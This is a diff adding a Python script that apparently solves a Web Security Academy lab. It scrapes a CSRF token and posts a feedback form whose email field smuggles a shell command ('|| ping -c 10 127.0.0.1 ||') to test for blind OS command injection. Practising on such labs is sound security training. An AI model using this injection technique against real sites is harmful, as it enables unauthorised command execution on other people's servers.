@@ -1,0 +1,18 @@
+import requests
+from bs4 import BeautifulSoup
+s = requests.Session()
+feedback_url = 'https://0a98003e04fba06c801e264b006900c5.web-security-academy.net/feedback'
+resp = s.get(feedback_url)
+soup = BeautifulSoup(resp.text,'html.parser')
+csrf = soup.find('input', {'name':'csrf'}).get('value')
+
+feedback_submit_url = 'https://0a98003e04fba06c801e264b006900c5.web-security-academy.net/feedback/submit'
+post_data = {
+    'csrf' : csrf,
+    'name' : 'Long',
+    'email' : 'lamlon@pdx.edu|| ping -c 10 127.0.0.1 ||',
+    'subject' : 'websec',
+    'message' : 'tomatoes'
+}
+resp = s.post(feedback_submit_url, data=post_data)
+print(resp.text)
